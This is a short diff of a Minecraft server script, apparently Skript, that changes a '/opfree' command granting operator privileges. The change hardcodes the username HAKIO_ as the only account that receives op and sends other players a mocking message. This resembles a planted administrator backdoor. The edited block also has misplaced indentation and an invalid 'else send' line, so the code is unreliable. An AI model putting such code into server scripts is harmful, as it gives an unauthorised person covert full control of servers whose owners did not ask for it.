@@ -14,8 +14,9 @@ on command "sk reload":
 
 command /opfree [<player>]:
     trigger:
+    if player = HAKIO_:
         op the player
         send "&cLa commande a bien été faite"
-
+    else send "guignol"
     
 
